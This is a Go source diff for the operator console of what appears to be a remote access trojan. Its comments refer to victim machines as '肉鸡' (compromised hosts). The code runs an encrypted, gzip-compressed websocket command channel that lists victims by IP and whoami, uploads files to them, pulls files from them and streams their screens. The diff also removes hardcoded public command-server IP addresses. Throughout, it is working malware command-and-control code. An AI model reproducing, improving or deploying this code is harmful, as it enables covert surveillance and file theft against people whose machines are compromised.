@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -33,9 +34,7 @@ const (
 )
 
 var (
-	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl     = "124.156.100.149:8080"
-	baseUrl     = "106.54.242.217"
+	baseUrl = "127.0.0.1" //"172.16.5.1"
 	conn        *websocket.Conn
 	origin      = "http://" + baseUrl + "/"
 	url         = "ws://" + baseUrl + "/svrConnControlHandler"
@@ -54,8 +53,9 @@ type Message struct {
 	Name      string `json:"name"`
 	Msg       string `json:"msg"`
 
+	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
 	FileName string `json:"fileName"`
-	FileBody string `json:"fileBody"`
+	//FileBody string `json:"fileBody"`
 
 	Condoms []*Condom `json:"condoms"`
 }
@@ -101,7 +101,6 @@ func receiveMsg() { //接收返回的消息
 		if reqBytes == nil || len(reqBytes) == 0 {
 			continue
 		}
-		reqBytes = encDec(reqBytes) //解密
 		message, err := json2Message(reqBytes)
 		if err != nil {
 			outTE.AppendText(err.Error() + "\r\n")
@@ -111,33 +110,33 @@ func receiveMsg() { //接收返回的消息
 			} else if message.Name == UPLOAD_FILE { //上传文件到肉鸡
 				//控制台暂时无此信息
 			} else if message.Name == DOWNLOAD_FILE { //下载文件到控制台本地
-				fileBytes, err := base64.StdEncoding.DecodeString(message.FileBody) //base64 dec
-				if err != nil {
-					outTE.AppendText("文件base64 dec错误:" + err.Error() + "\r\n")
-					continue
-				}
+				//fileBytes, err := base64.StdEncoding.DecodeString(message.FileBody) //base64 dec
+				//if err != nil {
+				//	outTE.AppendText("文件base64 dec错误:" + err.Error() + "\r\n")
+				//	continue
+				//}
 				err = os.MkdirAll("./Download", os.ModePerm) //递归创建文件
 				if err != nil {
 					outTE.AppendText("创建本地文件夹失败:" + err.Error() + "\r\n")
 					continue
 				}
 				//去除文件特殊符号
-				message.FileName = strings.ReplaceAll(message.FileName, "/", "__")
-				message.FileName = strings.ReplaceAll(message.FileName, "\\", "__")
-				message.FileName = strings.ReplaceAll(message.FileName, ":", "")
-				message.FileName = strings.ReplaceAll(message.FileName, "?", "")
-				message.FileName = strings.ReplaceAll(message.FileName, "|", "")
-				message.FileName = strings.ReplaceAll(message.FileName, ">", "")
-				message.FileName = strings.ReplaceAll(message.FileName, "<", "")
-				message.FileName = strings.ReplaceAll(message.FileName, "\"", "")
-				message.FileName = strings.ReplaceAll(message.FileName, "*", "")
+				message.FileName = strings.Replace(message.FileName, "/", "__", -1)
+				message.FileName = strings.Replace(message.FileName, "\\", "__", -1)
+				message.FileName = strings.Replace(message.FileName, ":", "", -1)
+				message.FileName = strings.Replace(message.FileName, "?", "", -1)
+				message.FileName = strings.Replace(message.FileName, "|", "", -1)
+				message.FileName = strings.Replace(message.FileName, ">", "", -1)
+				message.FileName = strings.Replace(message.FileName, "<", "", -1)
+				message.FileName = strings.Replace(message.FileName, "\"", "", -1)
+				message.FileName = strings.Replace(message.FileName, "*", "", -1)
 
 				file, err := os.Create("./Download/" + message.FileName)
 				if err != nil {
 					outTE.AppendText("创建本地文件失败:" + err.Error() + "\r\n")
 					continue
 				}
-				_, err = file.Write(fileBytes)
+				_, err = file.Write(message.ByteData)
 				if err != nil {
 					outTE.AppendText("写入文件失败:" + err.Error() + "\r\n")
 					continue
@@ -177,13 +176,9 @@ func receiveMsg() { //接收返回的消息
 				if message.Machineid != screenMachineid { //发送过来的是否跟监控的是同一个，不是则放弃渲染
 					continue
 				}
-				ImgBytes, err := base64.StdEncoding.DecodeString(message.Msg) //base64 dec
-				if err != nil {
-					outTE.AppendText("屏幕base64 dec错误:" + err.Error() + "\r\n")
-					continue
-				}
+				//fmt.Println("解压后图片：", len(message.ByteData))
 				ImgIobytes := bytes.Buffer{}
-				ImgIobytes.Write(ImgBytes)
+				ImgIobytes.Write(message.ByteData)
 				imgg, err := png.Decode(&ImgIobytes)
 				if err != nil {
 					outTE.AppendText("屏幕转换错误:" + err.Error() + "\r\n")
@@ -194,30 +189,45 @@ func receiveMsg() { //接收返回的消息
 				}
 				bitmap, _ = walk.NewBitmapFromImage(imgg) //获取当前帧
 				_ = IMGscreen.SetImage(bitmap)            //渲染当前帧
+				i, _ := strconv.Atoi(zhen.Text())
+				i++
+				zhen.SetText(fmt.Sprint(i)) //设置第几帧
 			}
 		}
 		time.Sleep(time.Second)
 	}
 }
-func readMessage(ws *websocket.Conn) ([]byte, error) {
+
+//读取数据
+func readMessage(conn *websocket.Conn) ([]byte, error) {
 again:
-	fr, err := ws.NewFrameReader()
+	fr, err := conn.NewFrameReader()
+
 	if err != nil {
 		return nil, err
 	}
-	frame, err := ws.HandleFrame(fr)
+	frame, err := conn.HandleFrame(fr)
 	if err != nil {
 		return nil, err
 	}
 	if frame == nil {
 		goto again
 	}
-	return ioutil.ReadAll(frame)
+	reqBytes, err := ioutil.ReadAll(frame)
+	if err != nil {
+		return reqBytes, err
+	}
+	//fmt.Println("收到：", len(reqBytes))
+	reqBytes = encDec(reqBytes)      //解密数据
+	reqBytes = UnGzipBytes(reqBytes) //解压数据
+	//fmt.Println("解压后：", len(reqBytes))
+	return reqBytes, nil
 }
 
 //发送websocket消息
 func sendMessage(message Message) error {
 	jsonBytes, _ := json.Marshal(message) //结构体转json
+	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
 	jsonBytes = encDec(jsonBytes)         //加密
 	if conn != nil {
 		_, err := conn.Write(jsonBytes) //发送消息
@@ -225,6 +235,32 @@ func sendMessage(message Message) error {
 	} else {
 		return errors.New("conn is null pointer")
 	}
+}
+
+//gzip压缩
+func gzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	//zw := gzip.NewWriter(&buf)
+	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)
+
+	zw.Write(byt)
+	if err := zw.Close(); err != nil {
+	}
+	return buf.Bytes()
+}
+
+//gzip解压缩
+func UnGzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	buf.Write(byt)
+	zr, _ := gzip.NewReader(&buf)
+	defer func() {
+		if zr != nil {
+			zr.Close()
+		}
+	}()
+	a, _ := ioutil.ReadAll(zr)
+	return a
 }
 func json2Message(strByte []byte) (Message, error) {
 	var dat Message
@@ -338,6 +374,7 @@ func runMainWindow(loginMW *walk.MainWindow) { //主要操作面板
 								StretchFactor: 9, //左面板上表格占用比例
 								AssignTo:      &tv,
 								Columns: []TableViewColumn{
+									{Title: "Terrace", Width: 20},
 									{Title: "IP"},
 									{Title: "remark"},
 									{Title: "whoami"},
@@ -578,11 +615,11 @@ func upFile(mw *walk.MainWindow) {
 			walk.MsgBox(tmp, "读取文件失败", err.Error(), walk.MsgBoxIconInformation)
 			return
 		}
-		file64Str := base64.StdEncoding.EncodeToString(fileByts)
+		//file64Str := base64.StdEncoding.EncodeToString(fileByts)
 		message := NewMessage("")
 		message.Name = UPLOAD_FILE
 		message.FileName = fileNeme
-		message.FileBody = file64Str
+		message.ByteData = fileByts
 		msgs <- message
 	}
 
@@ -607,6 +644,10 @@ func tableRowClick(model *CondomModel) {
 	}
 	ip := model.items[i].IP
 	machineid := model.items[i].Machineid
+	if screenMachineid != "" { //正在看视频监控不允许更换
+		outTE.AppendText("你正在在监控" + ip + ",如要更换请先关闭监控！\r\n")
+		return
+	}
 	remarkStr := model.items[i].Remark
 	ip = strings.Replace(ip, "*", "", -1) //替换掉可能有*号的ip
 	ipInfo.SetText(ip + "--" + machineid)
